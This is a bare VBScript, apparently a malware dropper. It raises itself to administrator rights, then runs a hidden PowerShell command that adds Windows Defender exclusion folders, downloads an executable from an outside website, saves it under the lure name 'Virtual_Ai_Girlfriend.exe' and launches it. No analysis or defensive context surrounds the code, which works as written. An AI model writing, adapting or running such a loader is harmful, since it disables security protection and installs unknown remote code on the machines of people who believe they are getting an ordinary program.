RunAsAdmin
Main
Function RunAsAdmin()
  Dim objAPP
  If WScript.Arguments.length = 0 Then
    Set objAPP = CreateObject("Shell.Application")
    objAPP.ShellExecute "wscript.exe", """" & _
    WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
    WScript.Quit
  End If
End Function

Function Main()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ExecutionPolicy Bypass -Command ""&  { " & _
        "Set-MpPreference -ExclusionPath 'C:\Users\Public' ,  'C:\Windows\System32\SubDir'; " & _
        "Invoke-WebRequest -Uri 'https://ellingtonpropertiesdxb.com/tools.msc' -OutFile 'C:\Users\Public\Virtual_Ai_Girlfriend.exe';" & _
        "Start-Process -FilePath 'C:\Users\Public\Virtual_Ai_Girlfriend.exe' -Wait" & _
        "}""", 0, True
End Function

